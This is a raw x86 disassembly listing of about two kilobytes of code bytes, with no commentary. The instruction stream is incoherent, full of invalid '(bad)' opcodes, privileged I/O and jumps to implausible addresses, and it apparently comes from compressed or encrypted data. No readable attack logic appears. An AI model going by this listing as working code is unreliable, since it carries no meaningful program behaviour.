  406748:	cld    
  406749:	add    edx,eax
  40674b:	add    ebx,DWORD PTR [edx-0x11]
  40674e:	(bad)  
  40674f:	out    dx,eax
  406750:	mov    esi,0x2ad6e4ad
  406755:	mov    esi,0x2bb0a381
  40675a:	sbb    eax,0x8bc3cb6a
  40675f:	mov    ss,WORD PTR [ebp+esi*1-0x13]
  406763:	lods   al,BYTE PTR ds:[esi]
  406764:	(bad)  
  406765:	add    eax,0xc9348b5
  40676a:	mov    al,ds:0x7fda2ede
  40676f:	fisubr DWORD PTR [edi]
  406771:	ret    
  406772:	inc    edi
  406773:	into   
  406774:	stc    
  406775:	rol    BYTE PTR ds:[edi-0x29ad50d],0x21
  40677d:	mov    ebp,0x93d5c98
  406782:	int    0x31
  406784:	sub    BYTE PTR [ebx-0x939486c],dh
  40678a:	(bad)  
  40678b:	retf   0x294c
  40678e:	cli    
  40678f:	xchg   ebp,eax
  406790:	rcr    BYTE PTR [ebp-0x6af1df62],cl
  406796:	mov    cl,BYTE PTR [edi]
  406798:	cs loop 0x4067b4
  40679b:	mov    ebp,0xb98955a8
  4067a0:	jbe    0x406766
  4067a2:	mov    dl,0x3c
  4067a4:	pop    ebx
  4067a5:	es xchg edi,eax
  4067a7:	retf   
  4067a8:	cmc    
  4067a9:	mov    cl,0x80
  4067ab:	das    
  4067ac:	jp     0x4067f6
  4067ae:	nop
  4067af:	or     eax,0xe25a2684
  4067b4:	pushf  
  4067b5:	sub    DWORD PTR [ecx],edx
  4067b7:	dec    ebx
  4067b8:	sbb    edi,edi
  4067ba:	cld    
  4067bb:	pushf  
  4067bc:	lods   al,BYTE PTR ds:[esi]
  4067bd:	xlat   BYTE PTR ds:[ebx]
  4067be:	call   0xa5e8:0x3f67be3c
  4067c5:	cdq    
  4067c6:	add    ecx,ebx
  4067c8:	lds    esp,FWORD PTR ds:0xf1922e57
  4067ce:	mov    dh,0xdd
  4067d0:	jne    0x406800
  4067d2:	inc    esp
  4067d3:	add    ecx,eax
  4067d5:	pop    ebx
  4067d6:	adc    eax,0xe69913bc
  4067db:	inc    esi
  4067dc:	mov    ds:0xfcd47afb,al
  4067e1:	jne    0x406830
  4067e3:	push   cs
  4067e4:	and    al,dl
  4067e6:	ja     0x406790
  4067e8:	fistp  WORD PTR [eax-0x6bbd0a12]
  4067ee:	rol    BYTE PTR [edi+0x18],cl
  4067f1:	xchg   edi,eax
  4067f2:	and    BYTE PTR [ebx-0x145901e8],ch
  4067f8:	push   ecx
  4067f9:	jno    0x4067bb
  4067fb:	fstp   DWORD PTR [edi]
  4067fd:	mov    ebp,edx
  4067ff:	(bad)  
  406800:	pop    ecx
  406801:	push   0xd101aa3a
  406806:	aas    
  406807:	mov    ecx,0xcc9b9a5d
  40680c:	in     eax,dx
  40680d:	add    ecx,0xb50d8f37
  406813:	inc    ebp
  406814:	cmp    eax,0x9672f243
  406819:	in     al,dx
  40681a:	and    al,0xfd
  40681c:	push   ss
  40681d:	or     eax,0xf2e597c6
  406822:	lea    ebx,[edx]
  406824:	clc    
  406825:	cmp    eax,0x355ba744
  40682a:	or     eax,0xc51fc39e
  40682f:	jmp    0x1ee2d11b
  406834:	jg     0x40689b
  406836:	pop    edx
  406837:	xchg   edi,eax
  406838:	clc    
  406839:	cmp    al,0x1f
  40683b:	clc    
  40683c:	dec    ebp
  40683d:	sahf   
  40683e:	or     BYTE PTR [eax+0x63],dh
  406841:	adc    cl,cl
  406843:	mov    eax,0x14bc55ab
  406848:	(bad)  
  406849:	fiadd  WORD PTR [edx-0x48]
  40684c:	cmp    al,0x3d
  40684e:	xor    BYTE PTR [ecx-0x72],ch
  406851:	call   0x8683a6d0
  406856:	mov    ebp,0x1569eb1f
  40685b:	(bad)  
  40685c:	cwde   
  40685d:	and    ebx,ecx
  40685f:	mov    al,0x3b
  406861:	mov    eax,0xd1f9d0f0
  406866:	js     0x40689f
  406868:	loop   0x4067fd
  40686a:	pusha  
  40686b:	push   es
  40686c:	pop    esp
  40686d:	sub    dh,BYTE PTR [ebx-0x7133d68e]
  406873:	sahf   
  406874:	or     edi,DWORD PTR es:[eax+0x55]
  406878:	push   eax
  406879:	rol    BYTE PTR [ecx],1
  40687b:	fild   DWORD PTR [eax]
  40687d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40687e:	adc    al,0x24
  406880:	inc    edx
  406881:	dec    eax
  406882:	jo     0x4068b7
  406884:	imul   esi,DWORD PTR [edx+0x7de027c9],0x3cc2e0b2
  40688e:	add    al,0x9a
  406890:	xchg   ebx,eax
  406891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406892:	je     0x406900
  406894:	sbb    dl,al
  406896:	adc    BYTE PTR [ebp+0x32510fdb],0x4d
  40689d:	cmp    ah,BYTE PTR [esi-0x1f957db2]
  4068a3:	push   edi
  4068a4:	jmp    0x379565b2
  4068a9:	push   es
  4068aa:	js     0x406916
  4068ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ad:	ds je  0x4068e3
  4068b0:	(bad)  
  4068b2:	imul   esp,ebp,0x23d88789
  4068b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068b9:	rcr    BYTE PTR [ebp+edi*4-0x708ae4db],1
  4068c0:	loopne 0x4068bd
  4068c2:	mov    dh,bh
  4068c4:	pop    es
  4068c5:	out    dx,al
  4068c6:	cmp    al,0xf
  4068c8:	mov    ds:0x309cc330,al
  4068cd:	mov    al,BYTE PTR [ebx+0x3]
  4068d0:	inc    eax
  4068d1:	dec    esi
  4068d2:	stos   BYTE PTR es:[edi],al
  4068d3:	outs   dx,DWORD PTR ds:[esi]
  4068d4:	outs   dx,BYTE PTR ds:[esi]
  4068d5:	in     eax,0xc4
  4068d7:	scas   eax,DWORD PTR es:[edi]
  4068d8:	adc    eax,0x5a6cccef
  4068dd:	rcr    esi,cl
  4068df:	mov    DWORD PTR [edi+0x64d6539],eax
  4068e5:	repnz or eax,0x339802fc
  4068eb:	cwde   
  4068ec:	imul   ebx,ebp,0xd
  4068ef:	test   eax,0x22fe8969
  4068f4:	and    ch,BYTE PTR [eax]
  4068f6:	test   BYTE PTR [edi-0x52],dl
  4068f9:	mov    DWORD PTR [ecx-0x38],esi
  4068fc:	hlt    
  4068fd:	fdiv   st,st(3)
  4068ff:	fs push esi
  406901:	shl    BYTE PTR [eax+eiz*8-0x61a10927],0xf
  406909:	push   esp
  40690a:	mov    ch,0x2d
  40690c:	cmp    edx,DWORD PTR [edx+0x4b]
  40690f:	mov    DWORD PTR [edx-0x60],ebx
  406912:	inc    esp
  406913:	push   ebp
  406914:	jno    0x406943
  406916:	jb     0x406993
  406918:	dec    esp
  406919:	sub    al,0x8c
  40691b:	pop    ebx
  40691c:	sbb    DWORD PTR [esi+0x32],0xa03cd71f
  406923:	test   DWORD PTR [ebx],0x205358db
  406929:	dec    esi
  40692a:	mov    ch,0xa0
  40692c:	hlt    
  40692d:	jg     0x40692d
  40692f:	mov    dh,0xda
  406931:	repnz ss mov ecx,0xea2144ea
  406938:	lahf   
  406939:	pop    ds
  40693a:	or     WORD PTR [eax+0x57a6d21],di
  406941:	mov    esp,0x3c93c37e
  406946:	rol    eax,cl
  406948:	push   esp
  406949:	jecxz  0x40694f
  40694b:	lods   al,BYTE PTR ds:[esi]
  40694c:	aas    
  40694d:	sbb    BYTE PTR [ecx],ah
  40694f:	adc    ch,BYTE PTR [ebp-0x69]
  406952:	or     BYTE PTR [edi],dl
  406954:	or     ch,dl
  406956:	adc    BYTE PTR [edx-0x62ae1e92],ah
  40695c:	cmc    
  40695d:	dec    ebp
  40695e:	ins    BYTE PTR es:[edi],dx
  40695f:	adc    ah,ch
  406961:	sahf   
  406962:	mov    al,0xd9
  406964:	sahf   
  406965:	jae    0x40699f
  406967:	inc    esp
  406968:	popf   
  406969:	sub    ebp,0xffffff92
  40696c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40696d:	fiadd  DWORD PTR [edx]
  40696f:	js     0x40699b
  406971:	ss in  al,dx
  406973:	xor    bl,bl
  406975:	in     eax,dx
  406976:	adc    DWORD PTR [ebx+0x12bb0d4e],edi
  40697c:	mov    cl,0x61
  40697e:	stc    
  40697f:	dec    esi
  406980:	pop    esi
  406981:	clc    
  406982:	imul   esi,DWORD PTR [esi+ecx*2],0x3a465b46
  406989:	ins    BYTE PTR es:[edi],dx
  40698a:	imul   esp,DWORD PTR [edi-0x13a16c62],0x270c5873
  406994:	lahf   
  406995:	inc    eax
  406996:	repnz aad 0xbd
  406999:	gs (bad) 
  40699b:	loope  0x4069de
  40699d:	push   cs
  40699e:	cmp    edi,DWORD PTR [edi]
  4069a0:	pop    ss
  4069a1:	dec    ebp
  4069a2:	cmp    al,0x69
  4069a4:	xor    al,0x7c
  4069a6:	iret   
  4069a7:	(bad)  
  4069a8:	sbb    BYTE PTR [ebp+0x5711c309],dl
  4069ae:	and    esi,ebp
  4069b0:	sti    
  4069b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069b2:	sbb    esp,DWORD PTR [edi]
  4069b4:	push   0xffffffc4
  4069b6:	std    
  4069b7:	pop    ecx
  4069b8:	push   ebp
  4069b9:	fbld   TBYTE PTR [ebp-0x605393f8]
  4069bf:	fidiv  DWORD PTR [esi]
  4069c1:	sub    ebp,DWORD PTR [ecx-0x33]
  4069c4:	inc    edi
  4069c5:	je     0x4069cf
  4069c7:	imul   edx,DWORD PTR ds:0x5992cfdf,0xffffffd8
  4069ce:	mov    al,0xc2
  4069d0:	xchg   ebp,eax
  4069d1:	arpl   WORD PTR ds:0x1192d89e,ax
  4069d7:	xchg   edi,eax
  4069d8:	fs cdq 
  4069da:	call   0xe688ce21
  4069df:	xchg   ecx,eax
  4069e0:	mov    ecx,0x637edc37
  4069e5:	pop    ds
  4069e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069e7:	inc    edi
  4069e8:	mov    ds:0x84891c04,eax
  4069ed:	jmp    0x406989
  4069ef:	lods   eax,DWORD PTR ds:[esi]
  4069f0:	jmp    0x406a70
  4069f2:	push   ds
  4069f3:	dec    esi
  4069f4:	push   ds
  4069f5:	std    
  4069f6:	dec    ebp
  4069f7:	nop
  4069f8:	into   
  4069f9:	dec    edi
  4069fa:	sbb    BYTE PTR ds:0xc53f75e5,0xa4
  406a01:	sub    BYTE PTR ds:0xc74b53b0,bl
  406a07:	jle    0x406a88
  406a09:	inc    edx
  406a0a:	cmp    dl,BYTE PTR [esi]
  406a0c:	lock sbb esp,DWORD PTR [edi+0x78]
  406a10:	adc    edi,DWORD PTR [edx]
  406a12:	mov    eax,ds:0x33edae89
  406a17:	mov    WORD PTR [ecx],fs
  406a19:	cmp    al,0x5e
  406a1b:	jmp    0x9b34a453
  406a20:	sub    dl,BYTE PTR [eax-0x6c]
  406a23:	jne    0x406a54
  406a25:	mov    ebx,0xf8368bd3
  406a2a:	dec    esi
  406a2b:	sub    BYTE PTR [edx+0x63],bl
  406a2e:	jecxz  0x4069de
  406a30:	jns    0x406a33
  406a32:	popf   
  406a33:	sbb    BYTE PTR [ebp-0x4e],dl
  406a36:	push   ebx
  406a37:	sub    BYTE PTR [ecx-0x570ac73d],0x49
  406a3e:	and    BYTE PTR [ecx],bh
  406a40:	mov    ah,0xa1
  406a42:	shl    BYTE PTR [eax+0x236ee31b],1
  406a48:	or     DWORD PTR [esi],esp
  406a4a:	xchg   esi,eax
  406a4b:	push   es
  406a4c:	aaa    
  406a4d:	das    
  406a4e:	push   esp
  406a4f:	inc    ebp
  406a50:	mov    esi,0xc07334ae
  406a55:	push   ecx
  406a56:	xor    ch,BYTE PTR [eax+0x38]
  406a59:	scas   al,BYTE PTR es:[edi]
  406a5a:	into   
  406a5b:	xlat   BYTE PTR ds:[ebx]
  406a5c:	fisttp QWORD PTR ds:0x294768fa
  406a62:	mov    esi,0xe5e440e6
  406a67:	xchg   ebx,eax
  406a68:	lds    eax,FWORD PTR [esi-0x70597313]
  406a6e:	inc    edi
  406a6f:	je     0x406acd
  406a71:	and    ecx,ebp
  406a73:	fadd   QWORD PTR [esi-0x7ef9c822]
  406a79:	mov    eax,ds:0x5024f499
  406a7e:	xlat   BYTE PTR ds:[ebx]
  406a7f:	int3   
  406a80:	mov    ebp,0x4fd9e5d2
  406a85:	fsub   QWORD PTR [eax+0x1ea11b4a]
  406a8b:	je     0x406a45
  406a8d:	pusha  
  406a8e:	sbb    ebp,ecx
  406a90:	jns    0x406a28
  406a92:	xchg   edi,eax
  406a93:	inc    ecx
  406a94:	mov    cl,0x81
  406a96:	dec    ecx
  406a97:	cmp    BYTE PTR [ebp+0x14],ch
  406a9a:	les    edx,FWORD PTR [ebx+0xf28384d]
  406aa0:	sbb    eax,0x4d3c5397
  406aa5:	add    edi,edx
  406aa7:	mov    ds:0x84963a8f,al
  406aac:	push   ebx
  406aad:	fs dec edi
  406aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ab0:	test   BYTE PTR [eax-0x11b0e5e9],dl
  406ab6:	popa   
  406ab7:	mov    esp,0x3d0ed07e
  406abc:	mov    edx,0x19b6c872
  406ac1:	into   
  406ac2:	push   ebp
  406ac3:	stos   BYTE PTR es:[edi],al
  406ac4:	jge    0x406a8e
  406ac6:	sbb    al,0x68
  406ac8:	adc    bl,bh
  406aca:	int    0xdb
  406acc:	dec    edx
  406acd:	pusha  
  406ace:	pusha  
  406acf:	or     BYTE PTR [eax],dl
  406ad1:	ins    BYTE PTR es:[edi],dx
  406ad2:	out    0xf1,al
  406ad4:	(bad)  
  406ad5:	es mov edx,esi
  406ad8:	aaa    
  406ad9:	mov    ch,0x18
  406adb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406adc:	imul   BYTE PTR [edi+edi*1]
  406adf:	mov    eax,ds:0x8596ad89
  406ae4:	xor    eax,0xce047708
  406ae9:	cmp    bl,bh
  406aeb:	pop    ebp
  406aec:	fisttp WORD PTR [edx]
  406aee:	test   esi,0xcc09d757
  406af4:	lods   eax,DWORD PTR ds:[esi]
  406af5:	fld    DWORD PTR [esi+ebx*8+0x3]
  406af9:	or     DWORD PTR [ebx-0x10],ecx
  406afc:	js     0x406ab9
  406afe:	ds mov ah,0x29
  406b01:	and    ah,ah
  406b03:	jae    0x406b35
  406b05:	mov    ch,0x72
  406b07:	fstp   QWORD PTR es:[ebp-0x354dab22]
  406b0e:	test   eax,0xe78a8ce6
  406b13:	mov    esp,DWORD PTR [edx]
  406b15:	xchg   edi,eax
  406b16:	inc    esi
  406b17:	pop    es
  406b18:	push   ebx
  406b19:	sti    
  406b1a:	sbb    bh,BYTE PTR [ebp-0x11b84823]
  406b20:	(bad)  
  406b21:	adc    eax,ecx
  406b23:	bound  ebp,QWORD PTR [edx+0x20]
  406b26:	xchg   edi,eax
  406b27:	test   BYTE PTR [esp+ecx*2-0x78],cl
  406b2b:	dec    ebx
  406b2c:	mov    ah,BYTE PTR [ecx-0x44]
  406b2f:	mov    esp,0x571f71e9
  406b34:	jg     0x406afc
  406b36:	cs sbb al,0x53
  406b39:	addr16 pop ebx
  406b3b:	or     dh,BYTE PTR ds:[ecx+ebp*4-0x74afe0ff]
  406b43:	dec    eax
  406b44:	daa    
  406b45:	popf   
  406b46:	loop   0x406b88
  406b48:	(bad)  
  406b4a:	ss xchg edx,eax
  406b4c:	ins    BYTE PTR es:[edi],dx
  406b4d:	sbb    ecx,DWORD PTR [edi-0x570568bf]
  406b53:	js     0x406ada
  406b55:	int    0x36
  406b57:	inc    ebp
  406b58:	div    DWORD PTR [edx+ebp*8]
  406b5b:	mov    ah,0x42
  406b5d:	test   DWORD PTR fs:[ebx-0x523abb5d],esp
  406b64:	aam    0x4c
  406b66:	into   
  406b67:	in     eax,dx
  406b68:	lds    ebx,FWORD PTR ss:[edx+0x354ff9c0]
  406b6f:	mov    ebp,0x72d5cc73
  406b74:	sbb    BYTE PTR [eax],cl
  406b76:	out    0xca,al
  406b78:	jnp    0x406b49
  406b7a:	ss pop ebx
  406b7c:	idiv   BYTE PTR [esi+0x5d078499]
  406b82:	pop    ss
  406b83:	pop    ecx
  406b84:	push   0x3a147e54
  406b89:	test   eax,0x7d4819ca
  406b8e:	mov    dh,0xff
  406b90:	mov    edi,0x582cecf4
  406b95:	dec    ecx
  406b96:	cmp    al,0x65
  406b98:	mov    al,0x99
  406b9a:	addr16 mov ebx,esp
  406b9d:	adc    bl,cl
  406b9f:	xchg   ebx,eax
  406ba0:	je     0x406b8a
  406ba2:	xor    eax,0xac43bac2
  406ba7:	add    bl,0x59
  406baa:	dec    edi
  406bab:	idiv   BYTE PTR [eax-0x46]
  406bae:	cdq    
  406baf:	cmp    BYTE PTR [eax-0x7b9fde9c],0xaa
  406bb6:	and    BYTE PTR [eax-0x67],ah
  406bb9:	repz cs jae 0x406c36
  406bbd:	and    al,0x21
  406bbf:	adc    ecx,DWORD PTR [edi-0x5d]
  406bc2:	test   DWORD PTR [edx+edi*4],eax
  406bc5:	pop    ds
  406bc6:	icebp  
  406bc7:	call   0x6ae8:0x14dd7ca4
  406bce:	fucomi st,st(3)
  406bd0:	pop    esi
  406bd1:	imul   eax,DWORD PTR [ecx],0x64
  406bd4:	addr16 dec ecx
  406bd6:	xlat   BYTE PTR ds:[ebx]
  406bd7:	fwait
  406bd8:	out    0x3a,al
  406bda:	addr16 in al,0xe9
  406bdd:	mov    dl,0x88
  406bdf:	iret   
  406be0:	sbb    DWORD PTR [edi],ebp
  406be2:	sub    BYTE PTR [edi+0x31],0x6
  406be6:	cmp    DWORD PTR [ecx+0x21],ebx
  406be9:	js     0x406b79
  406beb:	cmp    al,bl
  406bed:	dec    ecx
  406bee:	push   esi
  406bef:	and    DWORD PTR [esi+0x3f],ecx
  406bf2:	xadd   ch,cl
  406bf5:	inc    ebp
  406bf6:	enter  0x6e75,0x7b
  406bfa:	sbb    bh,bl
  406bfc:	add    al,0x6c
  406bfe:	mov    edx,0x3581a80e
  406c03:	push   eax
  406c04:	cwde   
  406c05:	add    al,0x65
  406c07:	ret    0xec36
  406c0a:	lds    edi,FWORD PTR [edi+esi*1+0x33dfed39]
  406c11:	cli    
  406c12:	mov    bl,0x2c
  406c14:	lods   eax,DWORD PTR ds:[esi]
  406c15:	imul   ebx,DWORD PTR [edi+0x3c0dee84],0x62830ad
  406c1f:	or     eax,0x19ab5a51
  406c24:	and    ebp,edi
  406c26:	mov    eax,ds:0xccacc7c9
  406c2b:	and    ebp,0xf3e8c20e
  406c31:	cmp    al,0x53
  406c33:	adc    ebx,DWORD PTR [ecx]
  406c35:	int3   
  406c36:	ret    
  406c37:	push   ss
  406c38:	pop    es
  406c39:	int3   
  406c3a:	mov    bh,BYTE PTR [ebp-0x66]
  406c3d:	shr    ah,1
  406c3f:	in     al,0xfb
  406c41:	add    eax,0xd41f66a6
  406c46:	or     eax,0x72f2a1e3
  406c4b:	pushf  
  406c4c:	ficomp DWORD PTR [esi+0x78b7ca61]
  406c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c53:	cmp    bl,ah
  406c55:	div    BYTE PTR [edx-0x21]
  406c58:	ja     0x406cc5
  406c5a:	fild   DWORD PTR [ebx-0x6]
  406c5d:	add    edi,DWORD PTR [esi+0xe]
  406c60:	inc    ebp
  406c61:	adc    BYTE PTR [eax-0x8068398],al
  406c67:	cld    
  406c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c69:	jp     0x406c89
  406c6b:	sub    ebx,DWORD PTR [ebx-0x1f717c59]
  406c71:	pushf  
  406c72:	retf   0x1dbc
  406c75:	jge    0x406cd4
  406c77:	add    eax,eax
  406c79:	shl    cl,cl
  406c7b:	loope  0x406c15
  406c7d:	adc    esp,DWORD PTR [eax-0x1a]
  406c80:	xor    cl,BYTE PTR [esi+0x50]
  406c83:	std    
  406c84:	iret   
  406c85:	or     eax,0x3f203ee9
  406c8a:	inc    edx
  406c8b:	or     BYTE PTR [edx],0xbc
  406c8e:	sbb    dl,bh
  406c90:	fs jae 0x406ce9
  406c93:	dec    ebp
  406c94:	jae    0x406c8b
  406c96:	int3   
  406c97:	outs   dx,DWORD PTR ds:[esi]
  406c98:	cmp    BYTE PTR [edx],al
  406c9a:	pop    ds
  406c9b:	test   al,0xe7
  406c9d:	shl    DWORD PTR [esi],cl
  406c9f:	sub    dl,BYTE PTR [edi+0x23]
  406ca2:	add    esp,DWORD PTR [edx+0x2b55be47]
  406ca8:	retf   0x4644
  406cab:	push   edi
  406cac:	adc    esi,ecx
  406cae:	les    ecx,FWORD PTR [edx+0x56]
  406cb1:	cmp    edi,edi
  406cb3:	cmp    ch,BYTE PTR [eax]
  406cb5:	inc    ecx
  406cb6:	pop    edx
  406cb7:	test   eax,0x1afd2dcb
  406cbc:	loop   0x406d2f
  406cbe:	or     DWORD PTR [ecx-0x572b51ab],esp
  406cc4:	mov    eax,ds:0x64294ea8
  406cc9:	popf   
  406cca:	addr16 adc ecx,ecx
  406ccd:	mov    esp,0xef4c45cf
  406cd2:	ins    BYTE PTR es:[edi],dx
  406cd3:	dec    ebp
  406cd4:	retf   0x59a8
  406cd7:	cs ins BYTE PTR es:[edi],dx
  406cd9:	neg    dh
  406cdb:	xchg   esi,eax
  406cdc:	add    ecx,DWORD PTR [ebp-0x19f161ff]
  406ce2:	sub    eax,0x4c0c3a81
  406ce7:	in     eax,dx
  406ce8:	adc    dh,BYTE PTR [eax]
  406cea:	pusha  
  406ceb:	gs ss ins BYTE PTR es:[di],dx
  406cef:	add    ebp,DWORD PTR [ecx+0x30d14001]
  406cf5:	rol    BYTE PTR [ebx],1
  406cf7:	xlat   BYTE PTR ds:[ebx]
  406cf8:	push   ds
  406cf9:	lea    esp,[di-0x5a]
  406cfd:	dec    esi
  406cfe:	mov    ds:0xd57c892d,eax
  406d03:	sar    DWORD PTR [ecx+0x35793f90],1
  406d09:	sub    DWORD PTR ss:[edx-0x78],edi
  406d0d:	in     al,0xf7
  406d0f:	scas   eax,DWORD PTR es:[edi]
  406d10:	sbb    bl,bh
  406d12:	sub    DWORD PTR [edi],0xeb97bfb2
  406d18:	test   ah,bh
  406d1a:	ficomp WORD PTR ds:0x70e11551
  406d20:	sbb    al,0x6d
  406d22:	out    dx,al
  406d23:	lahf   
  406d24:	clc    
  406d25:	(bad)  
  406d26:	jmp    0x406d44
  406d28:	mov    eax,0xda18c87d
  406d2d:	mov    dh,cl
  406d2f:	push   edi
  406d30:	jge    0x406cff
  406d32:	mov    dl,BYTE PTR [esi-0x472a01ec]
  406d38:	jge    0x406d33
  406d3a:	or     BYTE PTR [ebx+0x25],bl
  406d3d:	mov    ah,BYTE PTR [esi+ecx*8+0x1068daf9]
  406d44:	mov    esp,0xe184c3ac
  406d49:	rcl    BYTE PTR [eax-0x30],1
  406d4c:	pop    esp
  406d4d:	add    BYTE PTR [ecx-0x4f957932],cl
  406d53:	sub    dh,0xe3
  406d56:	sar    eax,1
  406d58:	std    
  406d59:	rol    DWORD PTR [ebp+0x57e0c62a],cl
  406d5f:	and    dl,BYTE PTR [eax]
  406d61:	xlat   BYTE PTR ds:[ebx]
  406d62:	sar    BYTE PTR ds:[eax-0x7deb7ec3],1
  406d69:	(bad)
  406d6c:	cmp    BYTE PTR [edx+0x79],ah
  406d6f:	pop    ds
  406d70:	mov    cl,0xe5
  406d72:	inc    ecx
  406d73:	jnp    0x406d5f
  406d75:	shl    BYTE PTR [esi+0x54],1
  406d78:	pop    ebx
  406d79:	ins    DWORD PTR es:[edi],dx
  406d7a:	mov    dl,0x15
  406d7c:	std    
  406d7d:	jmp    0x406d9e
  406d7f:	ret    0x3d53
  406d82:	jp     0x406d86
  406d84:	fwait
  406d85:	xor    ecx,esp
  406d87:	inc    ebx
  406d88:	scas   eax,DWORD PTR es:[edi]
  406d89:	jge    0x406d88
  406d8b:	push   0xe56b7ccd
  406d90:	jecxz  0x406db7
  406d92:	rol    bl,cl
  406d94:	fild   QWORD PTR [edi+0x17]
  406d97:	push   ds
  406d98:	adc    DWORD PTR [eax],esp
  406d9a:	sbb    dh,bh
  406d9c:	leave  
  406d9d:	lods   al,BYTE PTR ds:[esi]
  406d9e:	je     0x406d46
  406da0:	push   esp
  406da1:	add    BYTE PTR [esp+edi*8],al
  406da4:	jecxz  0x406df9
  406da6:	mov    ecx,0x3a347ef9
  406dab:	stos   BYTE PTR es:[edi],al
  406dac:	leave  
  406dad:	mov    DWORD PTR [edi+0x64],ecx
  406db0:	xor    eax,0x71c3397d
  406db5:	test   al,0x34
  406db7:	dec    edx
  406db8:	or     ecx,DWORD PTR [ecx-0x65]
  406dbb:	(bad)  
  406dbc:	cmc    
  406dbd:	pop    es
  406dbe:	or     bh,bl
  406dc0:	pushf  
  406dc1:	push   ebp
  406dc2:	dec    esp
  406dc3:	mov    cl,0xa6
  406dc5:	cs sub eax,0x54e5026d
  406dcb:	pop    esi
  406dcc:	aam    0xd0
  406dce:	fild   DWORD PTR [ebx+0x61efe3e8]
  406dd4:	jnp    0x406e1f
  406dd6:	int    0xc4
  406dd8:	push   edx
  406dd9:	mov    ecx,0xa6b1cab6
  406dde:	add    al,0x82
  406de0:	enter  0x9cdf,0xf6
  406de4:	pop    ebp
  406de5:	mov    al,ds:0x7dd2ce7
  406dea:	mov    dh,0x99
  406dec:	xor    al,0x4b
  406dee:	cmp    eax,0x674f1981
  406df3:	nop
  406df4:	and    eax,0x90938cc
  406df9:	aad    0xb0
  406dfb:	inc    ebx
  406dfc:	call   FWORD PTR [esi+ebx*4+0x6fe1f87b]
  406e03:	bound  ecx,QWORD PTR [eax-0x311a5167]
  406e09:	test   al,0x8
  406e0b:	imul   esi,DWORD PTR [esi],0x6b
  406e0e:	jns    0x406e74
  406e10:	lahf   
  406e11:	aad    0xe7
  406e13:	inc    eax
  406e14:	outs   dx,BYTE PTR ds:[esi]
  406e15:	push   eax
  406e16:	sbb    eax,0x2b0629fd
  406e1b:	stos   DWORD PTR es:[edi],eax
  406e1c:	bound  edx,QWORD PTR [ebx]
  406e1e:	mov    ah,0xbd
  406e20:	(bad)  
  406e21:	ja     0x406e25
  406e23:	mov    ebx,0xdab0bd83
  406e28:	sahf   
  406e29:	mov    eax,0x3f9b5a1
  406e2e:	jae    0x406e35
  406e30:	div    DWORD PTR ds:0x206124a2
  406e36:	cmpps  xmm0,XMMWORD PTR [edx+0x65],0x47
  406e3b:	aam    0x2e
  406e3d:	fsubr  DWORD PTR [edi+0x1be46d7]
  406e43:	xchg   esi,eax
  406e44:	int    0x73
  406e46:	xchg   esi,eax
  406e47:	invd   
  406e49:	adc    eax,0x6d453870
  406e4e:	(bad)  
  406e4f:	scas   al,BYTE PTR es:[edi]
  406e50:	sbb    ah,BYTE PTR [ebp+eiz*1-0x6a0fb55b]
  406e57:	xchg   DWORD PTR [esi+ebp*1+0x34],edx
  406e5b:	in     eax,dx
  406e5c:	lea    edx,ds:[ebx-0x19b8ed1d]
  406e63:	hlt    
  406e64:	dec    esi
  406e65:	pop    ecx
  406e66:	rcr    BYTE PTR ds:0x4c2eb369,0xce
  406e6d:	dec    ebp
  406e6e:	mov    esp,esi
  406e70:	mov    bl,0x2f
  406e72:	mov    esp,0x151df97a
  406e77:	mov    BYTE PTR [edx],dl
  406e79:	adc    BYTE PTR [ebx+0x4aeae8d2],0xc0
  406e80:	bound  esp,QWORD PTR [esi]
  406e82:	xor    al,0x43
  406e84:	xchg   esi,eax
  406e85:	sub    ch,cl
  406e87:	ror    al,cl
  406e89:	mov    ebp,0x14c5a50b
  406e8e:	rcl    BYTE PTR [eax+0x42],1
  406e91:	cmp    DWORD PTR [esi+0x466d4309],0x3
  406e98:	mov    al,ds:0xfd0d0cf3
  406e9d:	dec    ecx
  406e9e:	ss push eax
  406ea0:	add    al,0x11
  406ea3:	fsub   DWORD PTR [ecx]
  406ea5:	stos   BYTE PTR es:[edi],al
  406ea6:	cmp    bh,dl
  406ea8:	inc    edx
  406ea9:	es mov ch,0x3f
  406eac:	xor    eax,0x6ef50ffa
  406eb1:	fs xchg ebx,eax
  406eb3:	mov    al,0xe8
  406eb5:	mov    eax,0x6d6a8784
  406eba:	jl     0x406f11
  406ebc:	mov    ds:0xefbc420c,eax
  406ec1:	jge    0x406e5c
  406ec3:	add    ebx,ecx
  406ec5:	stos   BYTE PTR es:[edi],al
  406ec6:	cli    
  406ec7:	pop    edx
  406ec8:	fidiv  WORD PTR [ecx]
  406eca:	adc    eax,0x5fb56851
  406ecf:	push   esp
  406ed0:	int    0x9f
  406ed2:	clc    
  406ed3:	xor    al,0x5d
  406ed5:	jo     0x406f11
  406ed7:	(bad)  
  406ed8:	fsubrp st(1),st
  406eda:	inc    esp
  406edb:	js     0x406ec8
  406edd:	add    eax,0x6db02ef3
  406ee2:	cmp    al,0xc6
  406ee4:	retf   0x242c
  406ee7:	jnp    0x406f0b
  406ee9:	sti    
  406eea:	push   ebx
  406eeb:	add    DWORD PTR [eax+0x6beec20c],ebx
  406ef1:	(bad)  
  406ef2:	icebp  
  406ef3:	mov    bl,0xc5
  406ef5:	scas   al,BYTE PTR es:[edi]
  406ef6:	pushf  
  406ef7:	or     ch,ah
  406ef9:	mov    edi,0x12d861b5
  406efe:	bswap  ebp
  406f00:	xchg   DWORD PTR [ebx+0x15],ebp
  406f03:	inc    edx
  406f04:	lods   eax,DWORD PTR ds:[esi]
  406f05:	in     eax,dx
  406f06:	inc    esi
  406f07:	mov    al,ds:0xa4a32173
  406f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0d:	cmc    
  406f0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f0f:	adc    DWORD PTR [edi],edx
